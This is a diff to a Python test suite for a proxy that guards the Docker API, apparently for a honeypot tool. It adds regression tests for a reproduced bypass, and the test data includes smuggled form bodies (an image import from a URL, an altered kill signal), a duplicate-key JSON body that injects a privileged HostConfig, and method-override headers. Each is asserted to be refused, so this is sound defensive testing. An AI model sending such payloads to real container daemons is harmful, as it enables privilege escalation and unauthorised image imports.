@@ -75,7 +75,7 @@ def _with(**host: Any) -> dict[str, Any]:
 
 
 def test_the_expected_create_request_is_accepted():
-    assert _create(GOOD) == guard.Verdict()
+    assert _create(GOOD) == guard.Verdict(content_type="application/json")
 
 
 @pytest.mark.parametrize(
@@ -197,7 +197,7 @@ def test_empty_values_for_forbidden_settings_are_what_the_sdk_sends_and_are_acce
     body = _with(Binds=None, Privileged=False, CapAdd=[], Devices=None, PublishAllPorts=False)
     body.update(Volumes=None, Tty=False, OpenStdin=False, WorkingDir="", NetworkingConfig={})
     body["HostConfig"]["NetworkMode"] = "default"
-    assert _create(body) == guard.Verdict()
+    assert _create(body).content_type == "application/json"
 
 
 # ── everything else the Docker API offers ────────────────────────────────────────────────────
@@ -460,10 +460,9 @@ def test_the_engines_own_create_requests_pass_the_guard(deploy_type, config, egr
     bodies = _engine_create_bodies(deploy_type, config, egress=egress)
     assert len(bodies) >= 2, "the persona-volume create and the no-persona fallback"
     for name, body in bodies:
-        assert (
-            check("POST", f"/v1.43/containers/create?name={name}", json.dumps(body).encode())
-            == guard.Verdict()
-        )
+        assert check(
+            "POST", f"/v1.43/containers/create?name={name}", json.dumps(body).encode()
+        ) == guard.Verdict(content_type="application/json")
 
 
 # ── the proxy, over a real unix socket, against a fake daemon ────────────────────────────────
@@ -475,6 +474,7 @@ class FakeDocker:
     def __init__(self, path: str) -> None:
         self.path = path
         self.requests: list[tuple[str, str, bytes]] = []
+        self.headers: list[dict[str, str]] = []
         self.labelled = {"honeypot-ok": True, "other": False}
         self.server: asyncio.AbstractServer | None = None
         self.stream_open = asyncio.Event()
@@ -493,6 +493,7 @@ class FakeDocker:
             }
             body = await reader.readexactly(int(headers.get("content-length", 0)))
             self.requests.append((method, target, body))
+            self.headers.append(headers)
             if target.endswith("/json") and "/containers/" in target:
                 ref = target.split("/containers/")[1].split("/")[0]
                 if ref not in self.labelled:
@@ -753,3 +754,219 @@ async def test_a_horizontal_tab_in_a_header_value_is_ordinary_and_forwarded(prox
     reply = await _roundtrip(listen, b"GET /_ping HTTP/1.1\r\nHost: x\r\nX-Note: a\tb\r\n\r\n")
     assert reply.startswith(b"HTTP/1.1 200")
     assert fake.requests == [("GET", "/_ping", b"")]
+
+
+# ── the daemon reads more than the query string ──────────────────────────────────────────────
+#
+# Reproduced against a real daemon (Docker 29.7): a form-encoded POST body is merged into the
+# same parameters as the query string, body values first, so a body the guard never inspected
+# replaced `signal` (a kill the query check would have refused) and `fromImage`/`fromSrc`/`repo`
+# (an import from a URL, tagged as a new image). A repeated key in a create body made the
+# daemon merge `{"Privileged": true}` into a container the guard had validated as unprivileged.
+
+FORM = "application/x-www-form-urlencoded"
+IMPORT_BODY = b"fromImage=&fromSrc=http://192.0.2.1/x.tar&repo=cowrie/cowrie&tag=3.0.15"
+
+
+@pytest.mark.parametrize(
+    ("method", "target"),
+    [
+        ("POST", f"/images/create?fromImage={COWRIE_IMAGE}"),
+        ("POST", "/images/create?fromImage=cowrie/cowrie&tag=3.0.15"),
+        ("POST", "/containers/abc123/kill?signal=TERM"),
+        ("POST", "/containers/abc123/kill"),
+        ("POST", "/containers/abc123/stop"),
+        ("POST", "/containers/abc123/restart"),
+        ("POST", "/containers/abc123/start"),
+        ("POST", "/containers/abc123/pause"),
+        ("DELETE", "/containers/abc123"),
+        ("GET", "/containers/abc123/json"),
+        ("GET", "/containers/abc123/logs"),
+        ("GET", f"/containers/abc123/archive?path={BASE_PICKLE_PATH}"),
+        ("GET", "/_ping"),
+        ("GET", "/version"),
+        ("GET", f"/images/{COWRIE_IMAGE}/json"),
+        ("GET", '/containers/json?filters={"label":["honeypot-mcp=true"]}'),
+    ],
+)
+def test_an_endpoint_that_takes_no_body_refuses_one(method, target):
+    """Any body: the daemon would merge a form into the validated parameters."""
+    assert check(method, target, b"") is not None
+    for body in (IMPORT_BODY, b"signal=HUP", b"x"):
+        with pytest.raises(Denied) as exc:
+            check(method, target, body)
+        assert exc.value.status == 400
+
+
+def test_the_content_type_is_the_guards_to_choose_per_endpoint():
+    assert check("POST", f"/containers/create?{QUERY}", json.dumps(GOOD).encode()).content_type == (
+        "application/json"
+    )
+    persona = f"/containers/abc/archive?path={PERSONA_DIR}"
+    assert check("PUT", persona, b"tar bytes").content_type == "application/x-tar"
+    for method, target in (
+        ("POST", "/containers/abc/kill?signal=TERM"),
+        ("POST", f"/images/create?fromImage={COWRIE_IMAGE}"),
+        ("GET", "/containers/abc/logs"),
+    ):
+        assert check(method, target, b"").content_type is None
+
+
+@pytest.mark.parametrize(
+    "target",
+    [
+        f"/images/create?fromImage={COWRIE_IMAGE}&changes=ENV+X=1",
+        f"/images/create?fromImage={COWRIE_IMAGE}&message=x",
+        f"/images/create?fromImage={COWRIE_IMAGE}&fromSrc=",
+        f"/images/create?fromImage={COWRIE_IMAGE}&repo=",
+    ],
+)
+def test_an_image_pull_takes_only_the_image_tag_and_platform(target):
+    with pytest.raises(Denied):
+        check("POST", target, b"")
+
+
+def test_an_image_pull_may_name_a_platform():
+    assert check("POST", f"/images/create?fromImage={COWRIE_IMAGE}&platform=linux/amd64", b"")
+
+
+@pytest.mark.parametrize("action", ["stop", "restart"])
+@pytest.mark.parametrize("signal", ["SIGHUP", "USR1", "STOP", "0", ""])
+def test_stop_and_restart_cannot_deliver_an_arbitrary_signal(action, signal):
+    with pytest.raises(Denied):
+        check("POST", f"/containers/abc/{action}?signal={signal}", b"")
+
+
+@pytest.mark.parametrize("action", ["stop", "restart"])
+def test_stop_and_restart_still_accept_the_ordinary_calls(action):
+    assert check("POST", f"/containers/abc/{action}", b"")
+    assert check("POST", f"/containers/abc/{action}?t=5", b"")
+    assert check("POST", f"/containers/abc/{action}?signal=SIGTERM&t=5", b"")
+
+
+def _repeated_hostconfig_body() -> str:
+    """A privileged HostConfig first, the engine's own (valid) one last."""
+    return (
+        f'{{"Image": "{COWRIE_IMAGE}", "Labels": {{"honeypot-mcp": "true"}}, '
+        f'"HostConfig": {{"Privileged": true}}, "HostConfig": {json.dumps(GOOD["HostConfig"])}}}'
+    )
+
+
+def _create_text(text: str) -> guard.Verdict:
+    return check("POST", f"/containers/create?{QUERY}", text.encode())
+
+
+def test_a_create_body_that_repeats_a_key_is_refused():
+    """The real attack: Python validates the last `HostConfig`, the daemon merges both."""
+    assert _create_text(json.dumps(GOOD)).content_type == "application/json"
+    with pytest.raises(Denied) as exc:
+        _create_text(_repeated_hostconfig_body())
+    assert exc.value.status == 400 and "duplicate" in exc.value.message
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        # nested, exact
+        '{"HostConfig": {"Privileged": true, "Privileged": false}}',
+        # Go matches struct fields case-insensitively, so these name one field twice
+        '{"Image": "a", "image": "b"}',
+        '{"HostConfig": {"CapDrop": ["ALL"], "capdrop": []}}',
+        # inside a list element
+        '{"HostConfig": {"Mounts": [{"Type": "volume", "Type": "bind"}]}}',
+    ],
+)
+def test_repeated_keys_are_refused_wherever_they_occur(text):
+    with pytest.raises(Denied) as exc:
+        guard._loads_strict(text)
+    assert "duplicate" in exc.value.message
+
+
+def test_non_finite_json_constants_and_bad_utf8_are_refused():
+    for raw in ('{"Memory": NaN}', '{"Memory": Infinity}', '{"Memory": -Infinity}'):
+        with pytest.raises(Denied):
+            guard._loads_strict(raw)
+    with pytest.raises(Denied):
+        guard._loads_strict(b'{"Image": "\xff"}')
+    with pytest.raises(Denied):
+        guard._loads_strict("[" * 100000)
+
+
+def test_a_container_listing_filter_with_a_repeated_key_is_refused():
+    base = "/containers/json?filters="
+    ok = '{"label":["honeypot-mcp=true"]}'
+    assert check("GET", base + ok, b"")
+    with pytest.raises(Denied):
+        check("GET", base + '{"label":["honeypot-mcp=true"],"label":["x=y"]}', b"")
+
+
+async def test_a_client_chosen_content_type_and_other_headers_are_not_forwarded(proxy):
+    """Only the guard's own Content-Type reaches the daemon, and only a small allowlist else."""
+    listen, fake, _ = proxy
+    body = json.dumps(GOOD).encode()
+    raw = (
+        f"POST /containers/create?{QUERY} HTTP/1.1\r\nHost: evil\r\n"
+        f"Content-Type: {FORM}\r\nX-HTTP-Method-Override: DELETE\r\nX-Method-Override: DELETE\r\n"
+        "X-Registry-Auth: e30=\r\nUser-Agent: docker-sdk\r\nAccept: */*\r\nX-Evil: 1\r\n"
+        f"Content-Length: {len(body)}\r\n\r\n"
+    ).encode() + body
+    assert (await _roundtrip(listen, raw)).startswith(b"HTTP/1.1 200")
+    sent = fake.headers[0]
+    assert sent["content-type"] == "application/json"
+    assert sent["user-agent"] == "docker-sdk" and sent["accept"] == "*/*"
+    assert set(sent) == {
+        "host", "connection", "content-type", "content-length", "user-agent", "accept"
+    }  # fmt: skip
+
+
+async def test_the_persona_archive_is_sent_as_tar_whatever_the_client_declared(proxy):
+    listen, fake, _ = proxy
+    raw = (
+        f"PUT /containers/honeypot-ok/archive?path={PERSONA_DIR} HTTP/1.1\r\nHost: x\r\n"
+        f"Content-Type: {FORM}\r\nContent-Length: 4\r\n\r\ndata"
+    ).encode()
+    assert (await _roundtrip(listen, raw)).startswith(b"HTTP/1.1 200")
+    assert fake.headers[-1]["content-type"] == "application/x-tar"
+    assert fake.requests[-1][2] == b"data"
+
+
+@pytest.mark.parametrize(
+    "request_line",
+    [
+        f"POST /images/create?fromImage={COWRIE_IMAGE} HTTP/1.1",
+        "POST /containers/honeypot-ok/kill?signal=TERM HTTP/1.1",
+        "POST /containers/honeypot-ok/kill HTTP/1.1",
+    ],
+)
+async def test_a_form_body_cannot_ride_along_a_permitted_query(proxy, request_line):
+    """The reproduced attack, end to end: nothing reaches the daemon, not even the label probe."""
+    listen, fake, g = proxy
+    body = IMPORT_BODY if "images" in request_line else b"signal=HUP"
+    raw = (
+        f"{request_line}\r\nHost: x\r\nContent-Type: {FORM}\r\nContent-Length: {len(body)}\r\n\r\n"
+    ).encode() + body
+    reply = await _roundtrip(listen, raw)
+    assert reply.startswith(b"HTTP/1.1 400"), reply[:80]
+    assert fake.requests == [] and g.denied == 1
+
+
+async def test_a_create_with_a_repeated_key_never_reaches_the_daemon(proxy):
+    listen, fake, _ = proxy
+    body = _repeated_hostconfig_body().encode()
+    raw = (
+        f"POST /containers/create?{QUERY} HTTP/1.1\r\nHost: x\r\n"
+        f"Content-Type: application/json\r\nContent-Length: {len(body)}\r\n\r\n"
+    ).encode() + body
+    assert (await _roundtrip(listen, raw)).startswith(b"HTTP/1.1 400")
+    assert fake.requests == []
+
+
+@pytest.mark.parametrize("length", ["\u00b2", "+1", "1_0", "0x10", "-1", " "])
+async def test_a_content_length_that_is_not_plain_ascii_digits_is_refused(proxy, length):
+    listen, fake, _ = proxy
+    raw = (
+        f"POST /containers/honeypot-ok/start HTTP/1.1\r\nHost: x\r\nContent-Length: {length}\r\n\r\n"
+    ).encode("latin-1")
+    reply = await _roundtrip(listen, raw)
+    assert reply.startswith(b"HTTP/1.1 400"), reply[:80]
+    assert fake.requests == []
